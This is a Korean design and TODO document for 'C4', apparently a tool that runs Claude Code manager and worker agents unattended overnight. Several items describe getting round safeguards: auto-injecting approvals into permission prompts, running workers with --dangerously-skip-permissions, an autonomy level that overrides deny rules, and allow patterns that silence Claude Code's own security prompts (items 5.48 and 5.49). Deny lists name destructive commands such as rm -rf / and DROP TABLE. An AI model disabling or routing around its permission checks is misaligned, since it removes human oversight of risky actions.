# C4 TODO

## Phase 1 — 핵심 기능

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 1.1 | 자동 권한 판단 정교화 | **done** | autoApprove 패턴 매칭. config 기반 TUI 패턴, 버전 호환성 |
| 1.2 | 데몬 안정화 | **done** | daemon-manager.js + c4 daemon start/stop/restart/status. PID 파일 기반 |
| 1.3 | 작업자 초기 설정 자동화 | **done** | trust folder + /model max effort 2-phase 자동화 |
| 1.4 | Git Bash 경로 변환 해결 | **done** | MSYS_NO_PATHCONV=1 + fixMsysArgs() argv 자동 복원 |
| 1.5 | Git 브랜치 격리 | **done** | c4 task 명령. 작업자마다 자동 브랜치 생성. 2.1 통합 |
| 1.6 | Scribe 시스템 (컨텍스트 영속화) | **done** | JSONL 파서 + 컨텍스트 추출 + session-context.md 자동 생성 |
| 1.7 | 작업자 헬스체크 + 자동 재시작 | **done** | 주기적 alive 체크. 죽으면 자동 재시작 또는 관리자에게 보고 |
| 1.8 | 작업 스코프 정의 + 이탈 감시 | **done** | scope-guard.js. 파일/명령 스코프 검사 + 이탈 키워드 감지 |
| 1.9 | 관리자 개입 프로토콜 | **done** | 질문 감지, 에스컬레이션 감지, 루틴 감시. config.intervention 섹션 |
| 1.10 | `c4 init` 개선 | **done** | claude 경로 자동 감지, npm link → symlink → alias 폴백, EPERM 처리 |
| 1.11 | `c4 merge` + main 보호 | **done** | pre-commit hook으로 main 직접 커밋 차단. c4 merge로 테스트/문서 체크 후 머지 |
| 1.12 | git worktree 지원 | **done** | 작업자마다 별도 worktree. 같은 디렉토리 공유 문제 해결. 멀티 에이전트 필수 |
| 1.13 | CLAUDE.md 규칙 강제 이행 | **done** | pre-commit hook 복합 명령 경고, sendTask() 규칙 자동 삽입, config rules 섹션 |
| 1.14 | 재귀적 C4 구조 | **done** | 테스트 완료. 작업자가 c4 new/list/health 실행 가능. 같은 데몬 공유 |
| 1.15 | effort 자동 설정 안정화 | **done** | 재시도 로직 + 설정 가능한 딜레이. phaseTimeout으로 stuck 복구 |
| 1.16 | `c4 merge --skip-checks` | **done** | 문서 전용 커밋 등 체크 우회 플래그. TODO/CHANGELOG 수정 없어도 머지 허용 |
| 1.17 | worktree에서 main 보호 hook 적용 | **done** | worktree 생성 시 core.hooksPath를 원본 repo의 .githooks로 설정 |
| 1.18 | sendTask 긴 메시지 잘림 버그 | **done** | `_chunkedWrite()` 도입. 500자 청크 + 50ms 간격 전송으로 PTY 버퍼 오버플로우 방지 |
| 1.19 | _chunkedWrite setTimeout 레이스 | **done** | Promise 기반 순차 전송으로 전환. drain 이벤트로 백프레셔 처리, CR 유실 방지 |

### 1.6 Scribe 시스템 (상세)

세션 대화를 실시간 모니터링하고 핵심 맥락을 기록하는 서기(Scribe) 시스템.

**데이터 소스:**
- `~/.claude/projects/<project>/<session>.jsonl` — 전체 대화 기록 (compact 후에도 유지)
- 관리자 세션 + 모든 작업자 세션 포함
- user, assistant, system, tool_use 메시지 전부 기록됨

**동작 흐름:**
```
1. c4 scribe start → scribe 모드 활성화
2. 주기적 (5분마다) 활성 세션 jsonl 스캔
3. 새 메시지 감지 → 핵심 내용 추출 → docs/session-context.md 업데이트
4. compact 발생 → PostCompact hook으로 session-context.md 내용 컨텍스트에 자동 주입
5. 세션 교체 시 → 다음 세션이 session-context.md 읽고 이어감
```

**기록 대상 (자동 분류):**
- 설계 결정: "~로 하기로 했다", "~ 방향으로"
- 작업 상태: 누가 뭘 하고 있는지, 완료/미완료
- 에러/해결: 뭐가 실패했고 어떻게 고쳤는지
- TODO 변경: 새로 추가된 항목, 상태 변경
- 사용자 의도: 사용자가 원하는 방향, 제약 조건

**PostCompact hook:**
```json
{
  "hooks": {
    "PostCompact": [{
      "hooks": [{
        "type": "command",
        "command": "cat docs/session-context.md"
      }]
    }]
  }
}
```
- hook이 반환한 내용이 additionalContext로 모델에 주입
- compact 후에도 scribe가 정리한 핵심 맥락 유지

**구현 사항:**
- `c4 scribe start/stop/status` CLI 명령
- daemon에 scribe 타이머 (jsonl 스캔 주기 설정)
- jsonl 파서: 메시지 타입별 필터링 + 오프셋 추적 (이미 읽은 건 스킵)
- 요약 생성: scribe worker(Claude Code)를 필요 시 잠깐 띄워서 요약
- PostCompact hook 자동 설정 (`c4 init`에서)
- config에 scribe 설정: enabled, intervalMs, outputPath

**관리자 + 작업자 모두 지원:**
- 관리자 세션: 설계 결정, 사용자 의도 기록
- 작업자 세션: 구현 과정, 에러, 해결법 기록
- 종합 문서: 전체 프로젝트 진행 상황 한눈에

### 1.14 재귀적 C4 구조 (상세)

기본 동작은 확인됨 (작업자가 c4 new/list/health 실행 가능). 아래는 운영 설계:

**언제 쓰나:**
- 작업 5개 이상 병렬 시 → 관리자 부담 분산
- 도메인이 다른 작업 (프론트/백엔드) → 도메인별 중간 관리자
- 장시간 자율 작업 → 중간 관리자가 컨텍스트 분리

**계층 구조 관리:**
```
관리자 (Claude Code)
  ├─ fe-manager (중간 관리자, 프론트엔드 담당)
  │    ├─ fe-worker-1: 컴포넌트 리팩토링
  │    └─ fe-worker-2: 스타일 정리
  └─ be-manager (중간 관리자, 백엔드 담당)
       ├─ be-worker-1: API 엔드포인트
       └─ be-worker-2: 테스트 작성
```

**구현 필요 사항:**
- worker 메타데이터에 `parent` 필드 → 누가 누구의 하위인지 추적
- `c4 list --tree` → 계층 구조 트리 뷰 표시
- `maxWorkers` config → 전체 세션 수 제한 (비용 폭발 방지)
- 상위 관리자가 중간 관리자를 주기적 체크 (헬스체크 확장)
- 컨텍스트 전달 체인: 상위→중간→하위 요약 전달 프로토콜
- 중간 관리자가 산으로 가면 상위가 감지 → 중간 관리자에게 경고 또는 교체
- 하위 작업자 전부 완료 시 중간 관리자가 상위에게 보고

**사용 시 주의:**
- Claude Max 동시 세션 제한 확인 필요
- 계층이 깊을수록 토큰 비용 급증 (관리 오버헤드)
- 2단계 (관리자→중간관리자→작업자)가 현실적 한계, 3단계 이상은 비효율적

### 1.8 작업 스코프 정의 + 이탈 감시 (상세)

작업자가 "산으로 가는 것"을 방지하는 구조:

**작업 배정 시 스코프 정의:**
```
관리자 → 작업자: "src/rag.py에 설비 문서 로더 추가해"
  스코프:
    - 수정 허용: src/rag.py, knowledge/*.txt, tests/test_rag.py
    - 수정 금지: 그 외 전부
    - bash 허용: grep, find, cat, python -m pytest
    - bash 금지: pip install, npm, docker, git push
```

**이탈 감지:**
- 작업자가 스코프 밖 파일을 수정하려 하면 → 자동 deny + 관리자에게 보고
- 작업자가 스코프 밖 명령을 실행하려 하면 → 자동 deny + 관리자에게 보고
- 작업자의 출력에서 "방향 전환" 키워드 감지 (리팩토링, 더 나은 방법, 우선 ~부터)

**구현 방법:**
- `c4 new` 시 `--scope` 플래그 또는 작업 지시문에 스코프 포함
- autoApprove 룰에 파일 경로 기반 필터 추가
- 스냅샷 분석에서 스코프 이탈 패턴 감지

### 1.9 관리자 개입 프로토콜 (상세)

작업자-관리자 간 소통 규칙 정의:

**작업자가 관리자에게 반드시 물어야 하는 것:**
- 설계 선택지 ("A 방식 vs B 방식, 어느 걸로?")
- 스코프 확장 요청 ("이것도 같이 수정해야 할 것 같은데요")
- 에러 발생 보고 ("빌드 실패했습니다")
- 불확실한 요구사항 ("이 부분이 명확하지 않습니다")

**관리자가 자동으로 넘길 수 있는 것:**
- 스코프 내 파일 읽기/수정
- 합의된 테스트 실행
- 합의된 범위 내 Bash 명령

**작업자가 질문 없이 진행할 수 있는 것:**
- 스코프 내 코드 작성
- 스코프 내 테스트 작성/실행
- 기존 패턴 따라가기 (프로젝트 컨벤션)

**감지 방법:**
- 작업자 출력에서 "질문" 패턴 감지 ("할까요?", "어떻게", "선택지")
- 감지되면 자동 승인 중단 → 관리자에게 스냅샷 전달
- 관리자가 응답하면 작업 재개

**설계 문서 기반 감독:**
- 작업 시작 전 반드시 관련 설계 문서부터 찾기 (관리자 또는 작업자가)
  - TODO 파일, 아키텍처 문서, 스펙, CLAUDE.md 등
  - 없으면 사용자에게 물어보거나 작업 보류
- 설계 문서가 없는데 꼭 필요한 작업이면:
  1. 왜 필요한지 이유 문서 작성 (docs/ 또는 TODO에)
  2. 별도 브랜치 생성 (main에 직접 작업 금지)
  3. 틈틈이 커밋 (작은 단위로, 롤백 가능하도록)
  4. 완료 후 관리자/사용자 리뷰 거쳐서 머지
- 관리자가 설계 문서를 먼저 읽고 이해한 상태에서 작업 지시
- 작업자에게 "이 설계대로 구현해"로 지시 (설계 문서 경로 전달)
- 작업자 출력이 설계와 다른 방향이면:
  1. 먼저 작업자에게 이유를 물어봄 ("왜 설계와 다르게 가는 거야?")
  2. 이유가 합당하면 (설계 오류, 기술적 제약 등) 관리자가 판단하여 수용
  3. 이유가 불명확하거나 판단이 어려우면 실제 관리자(사용자)에게 보고 후 결정
  4. 이유 없이 벗어난 거면 원래대로 되돌리도록 지시
- 설계에 모호한 부분이 있으면 작업자가 멋대로 해석하지 않도록 관리자가 먼저 판단

**작업자 기본 루틴 (단위 작업마다):**
1. 구현
2. 테스트 실행
3. 관련 문서 업데이트 (TODO, README, CHANGELOG, patches/ 등)
4. 커밋
- 이 4단계를 건너뛰지 않도록 관리자가 감시
- 테스트 없이 커밋하거나, 문서 안 고치고 넘어가면 지적

**비판적 감시:**
- 관리자가 주기적으로 작업자 출력 리뷰 (자동 폴링)
- 작업자의 "thinking" 단계에서 방향이 맞는지 확인
- 장시간 진행 시 중간 체크포인트 강제
- 작업자가 "더 나은 방법이 있다"며 설계를 무시하려 하면 차단

## Phase 2 — 운영 안정화

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 2.1 | ~~멀티 에이전트 충돌 규칙~~ | **→1.5** | 브랜치 격리로 해결. lock 불필요 |
| 2.2 | 작업 의존성/순서 보장 | **done** | `--after worker-a` 플래그. 큐에서 의존성 완료 후 자동 생성 |
| 2.3 | 중복 작업 방지 | **done** | 큐 + workers에서 동일 이름 task 거부 |
| 2.4 | SSH 끊김 복구 | **done** | SSH ControlMaster + ServerAlive + 자동 재연결. [SSH WARN] 경고 스냅샷 |
| 2.5 | 토큰 사용량 모니터링 | **done** | JSONL 토큰 파싱. 일일 한도 + 경고 임계값. [TOKEN WARN] 경고 스냅샷 |
| 2.6 | 타임아웃 정책 | **done** | healthCheck에 timeoutMs 추가. 기본 10분 초과 시 [HEALTH] timeout 스냅샷 |
| 2.7 | 로그 관리 및 세션 복구 | **done** | 로그 로테이션(50MB). 종료 작업자 로그 자동 정리. 데몬 재시작 시 lost workers 표시. healthCheck에서 LOST worker worktree 안전 정리 (dirty 상태 확인 후 clean만 삭제, dirty는 보존+알림) + orphan c4-worktree-* 스캔/삭제 |
| 2.8 | API rate limit 큐잉 | **done** | maxWorkers config. 초과 시 큐에 대기. healthCheck에서 자동 디큐 |
| 2.9 | 자율 운영 구조 | **done** | watchdog.sh + 관리자 자동 생성 + scribe 연동 |

### 2.9 자율 운영 구조 (상세)

사용자 부재 시 C4가 자율적으로 개발을 계속하는 구조:

```
watchdog.sh (nohup, 60초 체크)
  ├─ 데몬 죽으면 → c4 daemon start
  ├─ 관리자 죽으면 → c4 new manager + 미션 재전송 + session-context.md 읽기 지시
  └─ scribe 죽으면 → c4 scribe start

관리자 (Claude Code, manager worker)
  ├─ TODO.md 읽고 다음 작업 파악
  ├─ c4 new/task로 작업자 생성 + 작업 지시
  ├─ c4 wait/read로 모니터링 + 권한 승인
  ├─ 완료 시 리뷰 → 머지 → push
  └─ 다음 작업으로 (끊기지 않게)

상위 관리자 (이 세션 또는 watchdog)
  ├─ 관리자가 멈추면 재시작 + 컨텍스트 전달
  ├─ scribe의 session-context.md로 맥락 복구
  └─ git log/TODO.md로 진행 상황 파악
```

**컨텍스트 복구 흐름:**
1. 관리자 죽음 감지
2. 새 관리자 생성
3. "docs/session-context.md 읽어" 지시 (scribe가 기록한 맥락)
4. "TODO.md 읽고 남은 작업 이어서 해" 지시
5. "git branch로 진행 중인 브랜치 확인" 지시
6. 관리자가 자율적으로 이어서 개발

**필요 조건:**
- watchdog.sh가 nohup으로 상주
- scribe가 주기적으로 세션 스캔
- healthCheck.autoRestart: true
- config.json에 모든 설정 확정

## Phase 3 — 확장

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 3.1 | 작업자 간 컨텍스트 전달 | **done** | sendTask() contextFrom 옵션. 최근 스냅샷 3개 주입. CLI --context 플래그 |
| 3.2 | 작업 결과 자동 검증 | **done** | 작업 완료 후 테스트/린트 자동 실행. 실패 시 작업자에게 피드백 |
| 3.3 | effort 동적 조절 | **done** | task 길이 기반 effort 자동 결정. config effort.dynamic/thresholds |
| 3.4 | 작업자 풀링 | **done** | pool.enabled/maxIdleMs config. idle worker 재활용. CLI --reuse 플래그 |
| 3.5 | 이벤트 기반 알림 | **done** | SSE GET /events. permission/complete/error/question 이벤트 |
| 3.6 | 롤백 지원 | **done** | c4 rollback 명령. git reset --soft. _startCommit 저장. /rollback API |
| 3.7 | 작업 히스토리 영속화 | **done** | history.jsonl에 작업 기록. close() 시 자동 기록. c4 history로 조회 |
| 3.8 | ScreenBuffer 개선 | **done** | 복잡한 TUI 테이블 렌더링 깨짐 수정. scrollback 읽기 지원 |
| 3.9 | MCP 서버 모드 | **done** | HTTP MCP 프로토콜 엔드포인트. JSON-RPC 2.0. mcp-handler.js |
| 3.10 | Planner Worker | **done** | c4 plan 명령. plan.md 작성 전용 모드. planner.js |
| 3.11 | State Machine (Plan→Edit→Test→Fix) | **done** | 작업자 단계 추적. 테스트 실패 시 fix 전환. N회 실패 시 에스컬레이션. state-machine.js |
| 3.12 | Adaptive Polling | **done** | 출력 활동량 기반 동적 폴링. min 500ms ~ max 5000ms. adaptive-polling.js |
| 3.13 | Interface Abstraction | **done** | Terminal-Agent 추상 레이어. Claude Code 패턴 분리. terminal-interface.js |
| 3.14 | Summary Layer | **done** | 긴 스냅샷 자동 요약. 에러/파일/테스트/결정 추출. summary-layer.js |
| 3.15 | Hook 기반 아키텍처 전환 | **done** | ScreenBuffer 파싱 대신 Claude Code hook(PreToolUse/PostToolUse)으로 작업자 행동 수신. 정확한 JSON 데이터 기반 판단 |
| 3.16 | 작업자별 .claude/settings.json 자동 생성 | **done** | worktree 생성 시 permissions, hooks, allowed tools 자동 설정. 작업자 역할별 프로파일 |
| 3.17 | Subagent Swarm 지원 | **done** | 작업자 내부에서 Claude Code Agent 도구로 하위 에이전트 병렬 처리. C4는 hook으로 모니터링만 |
| 3.18 | 역할별 작업자 템플릿 | **done** | Planner(Opus), Executor(Sonnet), Reviewer(Haiku) 등 역할별 모델/도구/프롬프트 프리셋 |
| 3.19 | Auto Mode 연동 | **done** | 작업자에 permissions.defaultMode: "auto" 적용. Claude 자체 classifier로 안전성 판단 위임 |
| 3.20 | Linux/macOS 지원 | **done** | 플랫폼 유틸리티 함수. macOS homebrew/nvm 경로 지원. process.platform 분기 완성 |

## Phase 4 — 완전 자율화

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 4.1 | 완전 무인 운영 모드 | **done** | global auto mode로 권한 자동 승인. PostCompact hook으로 컨텍스트 복구. claude --resume 세션 이어가기 |
| 4.2 | Hook 이벤트 JSONL 영속화 | **done** | PostToolUse/PreToolUse 이벤트를 logs/events-<worker>.jsonl에 저장. 리플레이/디버깅 |
| 4.3 | 승인 요청 웹 UI | **done** | GET /dashboard 라우트. 워커 목록/상태/스냅샷 HTML 서빙. 다크 테마, XSS 보호, 30초 자동 새로고침 |
| 4.4 | 아침 보고서 자동 생성 | **done** | 야간 작업 완료 후 docs/morning-report.md 자동 생성. 완료/실패/수정 필요 항목 요약 |
| 4.5 | 관리자 자동 컨펌 정책 | **done** | Level 0~4 지원. autonomyLevel 4: deny도 approve+로그. 완전 자율 |
| 4.6 | PreToolUse hook으로 복합 명령 차단 | **done** | 작업자 .claude/settings.json에 hook 자동 삽입. &&, |, ; 감지 시 block. 승인 요청 자체가 안 뜨게 |
| 4.7 | 관리자 컨텍스트 한계 자동 대응 | **done** | PostCompact hook 컨텍스트 주입 + compact 횟수 추적 + 관리자 자동 교체 |
| 4.8 | c4 auto 원커맨드 실행 | **done** | c4 auto "작업 내용" 하면 관리자+scribe+작업자 전부 자동 생성, 완료 시 morning-report 생성 |
| 4.9 | 작업자 .claude/settings.json 프리셋 | **done** | worktree 생성 시 역할별 permissions+hooks 자동 삽입. 복합 명령 차단 hook 포함 |
| 4.10 | 관리자-작업자 간 Hook 기반 통신 | **done** | Notifications 모듈(Slack webhook+Email). healthCheck 연동. 작업 완료/에러/헬스 이벤트 알림 |
| 4.11 | c4 status 명령 + AI 요약 알림 | **done** | `c4 status <name> "msg"` — worker가 직접 Slack에 상태 메시지 전송. daemon /status-update 라우트 |
| 4.12 | 메시지 채널 확장 | **done** | Channel 플러그인 구조 리팩토링. Discord(Webhook), Telegram(Bot API), KakaoWork(Webhook) 채널 추가. pushAll/startAll/stopAll. 하위 호환 유지 |
| 4.13 | config.example.json + CLAUDE.md 최신화 | **done** | config.example.json에 intervention, notifications.language 추가. CLAUDE.md에 CLI 전체 명령어 레퍼런스 추가 |
| 4.14 | _getLastActivity JSONL 기반 전환 | **done** | raw screen 패턴 매칭 제거. logs/events-<worker>.jsonl에서 최근 tool_use 읽어서 "Edit: foo.js, Write: bar.js" 형태 반환. 폴백: taskText 첫줄 |
| 4.15 | notifyStall 긴급 알림 | **done** | intervention 상태 또는 5분+ 무출력 시 Slack webhook 즉시 전송. healthCheck에서 자동 감지 |
| 4.16 | alertOnly 모드 | **done** | `notifications.slack.alertOnly: true` 시 STALL/ERROR만 Slack 전송. 일반 알림(statusUpdate, notifyEdits, notifyTaskComplete, notifyHealthCheck) 억제 |
| 4.17 | auto-resume idle 큐 확인 + worktree 완전 hook 세트 | **done** | idle 콜백에서 _taskQueue 매칭 태스크 자동 전송. _processQueue에 idle 워커 감지 로직 추가. _buildWorkerSettings() 완전한 hook 세트 직접 생성. 복합 명령 차단을 PreToolUse 첫 번째로 배치 |
| 4.18 | merge-homedir config 폴백 | **done** | cli.js merge 핸들러에 config.json projectRoot 폴백 추가. 홈디렉토리에서 c4 merge 실행 가능 |
| 4.19 | Slack task 요약 절단 버그 수정 | **done** | `_fmtWorker()`, `notifyTaskComplete()`, `notifyError()`에서 `split(/[.\n]/)` -> `split('\n')`으로 수정. 파일명의 `.`에서 잘리던 task 요약 복원. 5개 테스트 추가 |
| 4.20 | notifyHealthCheck 상태 누락 수정 | **done** | `restarted` 워커가 alive 목록에서 누락, `restart_failed` 워커가 dead 목록에서 누락되던 문제 수정. LANG에 라벨 추가. 4개 테스트 추가 |
| 4.21 | 좀비 데몬 정리 | **done** | daemon stop이 SIGKILL 후에도 종료 확인 없이 ok 반환하던 버그 수정. 매 단계 종료 확인, race condition 처리, Windows taskkill/SIGKILL 분리, 생존 시 에러 반환. 9개 테스트 |
| 4.22 | SSH target worktree 생성 방지 | **done** | SSH target(dgx 등) worker에 불필요한 로컬 worktree 생성 방지. `_resolveTarget()`으로 target type 확인 후 ssh이면 `useWorktree=false` 강제. 3개 테스트 추가 |
| 4.23 | 트러블슈팅 가이드 | **done** | docs/troubleshooting.md 신규 작성. 좀비 데몬/worktree 잔여물/STALL 반복/lost 워커 복구/CLI 에러 5개 섹션. 증상/원인/해결/예방 구조. Quick Reference 테이블 |
| 4.24 | 알림 동작 수정 | **done** | `notifyHealthCheck()` 워커 없을 때 daemon OK 메시지 삭제 (노이즈 제거). `notifyTaskComplete()` alertOnly 체크 제거 - 완료 메시지 항상 전송 |
| 4.25 | Windows 콘솔 창 숨김 (windowsHide) | **done** | execSync 래퍼(`execSyncSafe`) 도입하여 `windowsHide: true` 기본 적용. daemon spawn에도 `windowsHide: true`. pty.spawn에 `useConpty: false` 추가 |

### 4.1 완전 무인 운영 모드 (상세)

목표: "시켜놓고 자면 아침에 결과만 확인"

현재 문제:
- 관리자(Claude Code)가 작업자 권한 요청할 때마다 사람이 Enter 눌러줘야 함
- 데몬 죽으면 watchdog이 살려도 관리자 컨텍스트 소실
- 긴 작업 중 관리자 세션 컨텍스트 한계

해결 방향:
```
1. 관리자 = Claude Code + acceptEdits 모드
   - 작업자에게 accept edits on 자동 설정
   - Bash 명령은 autoApprove + alwaysApproveForSession으로 최대한 자동
   
2. 작업자 = --dangerously-skip-permissions 모드 (격리된 worktree에서만)
   - worktree는 격리되어 있으니 위험도 낮음
   - main 보호 hook이 최후 방어선
   
3. 관리자 세션 자동 이어가기
   - scribe가 컨텍스트 기록
   - 관리자 죽으면 새 관리자 + session-context.md 읽기
   - claude --resume으로 세션 이어가기 시도

4. 데몬 레벨 자동 승인
   - autoApprove를 daemon에서 직접 처리 (PTY에 Enter 주입이 아닌)
   - 작업자가 idle이고 권한 프롬프트 패턴 감지되면 자동 Enter
```

### 4.5 관리자 자동 컨펌 정책 (상세)

작업자가 컨펌 요청할 때 관리자 개입 없이 자동 처리하는 정책:

```
Level 0 (현재): 모든 컨펌 수동
Level 1: 읽기 명령 자동, 쓰기 수동 (autoApprove)
Level 2: 스코프 내 쓰기도 자동, 스코프 밖만 수동
Level 3: 전부 자동, 위험 명령만 거부 (deny 룰)
Level 4: 전부 자동, 위험 명령도 로그만 (완전 자율)
```

config에 `autonomyLevel: 3` 같은 설정으로 조절.

Level 3이면:
- 파일 읽기/수정/생성: 자동 승인
- ls, grep, find, git: 자동 승인
- npm test, node: 자동 승인
- rm, sudo, git push --force: 자동 거부
- 그 외: 자동 승인 + 로그 기록

Level 4이면:
- Level 3과 동일하되 deny 룰도 approve로 오버라이드
- `[AUTONOMY L4]` 스냅샷으로 오버라이드 이력 기록
- `autonomyOverride: true` 플래그로 구분 가능
- config: `autoApprove.autonomyLevel: 4`

이러면 밤새 사람 개입 없이 돌아감.

## Phase 5 - 실사용 테스트 + 강제 메커니즘

| # | 항목 | 상태 | 설명 |
|---|------|------|------|
| 5.1 | auto-mgr 도구 제한 | **done** | _buildAutoManagerPermissions()에서 Read/Write/Edit/Grep/Glob deny. Bash(c4:*) + Bash(git -C:*) 만 allow |
| 5.2 | 실사용 테스트 시나리오 | **done** | c4로 작업 시켜보고 관찰. docs/test-scenarios.md에 시나리오 작성 |
| 5.3 | CLAUDE.md 개선 | **done** | worker가 c4 명령어를 더 잘 쓰도록 사용 예시/패턴 보강 |
| 5.4 | worker close 시 Slack flush | **done** | notifyTaskComplete 후 즉시 _flushAll() 호출 |
| 5.8 | Custom Agents 활용 | **done** | .claude/agents/manager.md 로 관리자 에이전트 정의 |
| 5.9 | claude -w 네이티브 worktree 검토 | **done** | Claude Code 내장 worktree 활용 가능한지 평가. docs/native-worktree-review.md |
| 5.10 | Hook으로 권한 요청 Slack 라우팅 | **done** | hook에서 권한 prompt를 Slack으로 보내서 폰에서 승인 |
| 5.11 | Batch 처리 | **done** | c4 batch --count N / --file tasks.txt. CLI에서 POST /task N회 호출. 워커 자동 네이밍 batch-1~N |
| 5.12 | 매니저 교체 시 의사결정 요약 주입 | **done** | compact 전에 핵심 진행/주의사항 3줄 요약 -> session-context.md 상단에 주입 |
| 5.13 | L4 Critical Deny List | **done** | rm -rf /, git push --force, DROP TABLE 등 파괴적 명령은 L4에서도 절대 차단 |
| 5.14 | Resume 후 Re-orientation | **done** | 복구 직후 scrollback 읽어서 마지막 작업 안내 |
| 5.15 | Dirty Worktree Slack 경고 | **done** | STALL처럼 눈에 띄게 알림 |
| 5.16 | --repo 옵션 | **done** | c4 task --repo /path/to/other-project 로 다른 프로젝트 worktree 생성 지원 (5.17과 동일) |
| 5.17 | c4 task --repo 옵션 구현 | **done** | cli.js --repo 파싱, daemon.js projectRoot 전달, pty-manager sendTask 연결 |
| 5.18 | c4 send 자동 Enter | **done** | input과 CR 분리 전송: _chunkedWrite로 input 전송 후 100ms 대기, 별도 proc.write('\r') |
| 5.19 | PreToolUse 복합 명령 차단 실효성 | **done** | 원인: 워커가 home dir에서 스폰되어 worktree settings.json 미로드. 수정: worktree 생성 후 스폰 + standalone script 분리 |
| 5.20 | CI 피드백 루프 | **done** | worker 커밋 후 npm test 자동 실행, 실패 시 worker에 자동 피드백. config.ci.enabled/testCommand/timeoutMs 설정 |
| 5.21 | 하이브리드 안전 모드 | **done** | L4에서도 rm -rf, push --force 등 위험 명령은 Slack 승인 요청 |
| 5.22 | Recursive C4 테스트 시나리오 | **done** | 관리자->중간관리자->작업자 3단계 계층 테스트. docs/test-scenarios.md |
| 5.23 | 경쟁자 분석 문서 | **done** | docs/competitive-analysis.md. Agent Tool, Cursor, OpenHands, Cline, Aider, Copilot 비교 |
| 5.24 | worker auto-approve 범위 확장 | **done** | python, pip, ffmpeg 등 개발 도구를 autoApprove rules에 기본 포함 |
| 5.25 | 다른 프로젝트 브랜치 정리 | **done** | c4 worker가 만든 c4/ 접두사 브랜치를 close 시 자동 삭제 |
| 5.26 | worker 권한 프로파일 | **done** | 프로젝트 유형별 auto-approve 프리셋. web/ml/infra 3종 추가 + c4 profiles CLI + /profiles API |
| 5.27 | 실사용 실패 케이스 문서화 | **done** | docs/known-issues.md에 실패 사례 기록. 해결 8건 + 미해결 1건 + 패턴 요약 |
| 5.28 | 관리자 자동 승인 방지 | **done** | 관리자가 cron으로 자동 Enter 보내는 패턴 차단. 위험 명령 무분별 승인 방지 |
| 5.29 | intervention 발생 시 관리자 알림 | **done** | question/escalation/permission 감지 시 즉시 notifyStall 호출. healthCheck 30초 대기 없이 실시간 알림 |
| 5.30 | 서브모듈 프로젝트 diff 지원 | **done** | git diff --stat이 서브모듈 포인터만 보이는 문제. --submodule=diff 옵션 자동 적용 |
| 5.31 | 다른 repo 브랜치 자동 정리 | **done** | c4 worker close 시 해당 worker가 만든 c4/ 접두사 브랜치를 자동 삭제. worktree remove + branch delete |
| 5.32 | worktree prune 자동화 | **done** | healthCheck에서 주기적으로 git worktree prune 실행. prunable worktree 감지 시 자동 정리 |
| 5.33 | c4 cleanup 명령 | **done** | 수동 정리 명령어. 모든 LOST worker의 worktree + 브랜치 + 잔여 디렉토리를 한 번에 정리 |
| 5.34 | autoApprove에 개발 도구 추가 | **done** | nvidia-smi, nohup, lsof, env, which, whoami, poetry를 worker defaultPerms에 추가 |
| 5.35 | 긴 task 메시지 잘림 근본 수정 | **done** | 1000자 초과 task는 worktree/.c4-task.md에 파일로 저장, PTY에는 경로만 전달. _maybeWriteTaskFile() 헬퍼로 _buildTaskText + sendTask 인라인 모두 적용 |
| 5.36 | c4 approve 편의 명령 | **done** | `c4 approve <name> [option_number]` — TUI 선택 프롬프트를 번호로 선택. option_number 지정 시 (N-1) Down + Enter 전송. CLI, daemon, pty-manager 3계층 확장 |
| 5.37 | --no-branch/--cwd 외부 repo 지원 개선 | **done** | --cwd 지정 시 해당 디렉토리 기준 repo root 탐지. --no-branch 시 useWorktree도 false로 강제. task 명령에 --cwd 추가, --repo vs --cwd 차이 문서화 |
| 5.38 | Slack 메시지 길이 제한 + task 요약 포함 | **done** | pushAll() 2000자 truncate, _fmtWorker() activity 있어도 task 요약 항상 표시, notifyHealthCheck() dead worker에도 task 요약 포함. |
| 5.39 | 관리자가 c4 list 무한 반복하는 문제 | **done** | 실측: 324번 c4 list 호출, 사용자 메시지 3개. 해결: (1) CLAUDE.md에 "c4 wait 사용, c4 list 폴링 금지" 명시, (2) c4 list에 10초 cooldown (캐시 반환), (3) Custom Agent에 "wait만 사용" 규칙. |
| 5.40 | worker 이름에 작업 설명 포함 | **done** | w-535 같은 의미없는 이름 대신 task 기반 자동 네이밍. c4 task 시 이름 자동 생성(task 첫 단어 기반) 또는 관리자에게 의미있는 이름 사용 강제. |
| 5.41 | worktree close 후 정리 검증 | **done** | _removeWorktree에 fs.existsSync 잔존 확인 + fs.rmSync 폴백 + prune. healthCheck에 git worktree list 기반 orphan c4-worktree-* 스캔(_cleanupOrphanWorktreesByList). 10개 테스트 |
| 5.42 | c4 watch 실시간 스트리밍 | **done** | worker 출력을 tail -f처럼 실시간 스트리밍. SSE /watch 엔드포인트 + PTY onData를 watchWorker()로 파이프. base64 인코딩. |
| 5.43 | 관리자 병렬 wait | **done** | c4 wait --all 또는 c4 wait w1 w2 w3 동시 대기 후 첫 완료 시 반환. waitAndReadMulti() 메서드, /wait-read-multi 라우트 |
| 5.44 | interrupt-on-intervention | **done** | c4 wait --interrupt-on-intervention: intervention 감지 시 wait 즉시 종료 + 해당 worker 정보 반환. 단일/병렬 wait 모두 지원 |
| 5.45 | 관리자 역할 가이드 강화 | **done** | CLAUDE.md에 관리자 승인 프로토콜 추가: read-now -> 판단 -> 승인/수정 3단계. 맹목적 승인 금지, 판단 기준 명시 |
| 5.46 | 실패 사례: w-535/w-536 복합 명령 차단으로 작업 불가 | **done** | docs/known-issues.md에 기록 완료. exit(2) block -> exit(0) warning 변경 경위 포함 |
| 5.47 | PreToolUse 복합 명령 차단 정책 재검토 | **done** | exit(2) block -> exit(0) warning으로 변경 완료. worker가 멈추지 않고 경고만 표시. |
| 5.48 | Claude Code 자체 compound command 승인 prompt | **done** | cd && git 할 때 Claude Code가 "bare repository attacks" 경고로 승인 요청. c4 hook과 별개. 해결: worker worktree settings.json permissions에 compound command 패턴 allow 추가 (cd * && *, cd * ; *, cd * || *) |
| 5.49 | task 메시지 # 특수문자 승인 prompt | **done** | # 포함 시 Claude Code가 "Newline followed by # can hide arguments" 보안 경고. _maybeWriteTaskFile에서 # 감지 시 길이 무관하게 파일 전달 모드 사용 |
| 5.50 | 관리자가 git -C 안 쓰는 문제 | **done** | _getRulesSummary()에 IMPORTANT git -C path 형태만 허용, cd 후 git 절대 금지 규칙 강화. cd X && git Y, cd X; git Y 모두 불가 명시 |
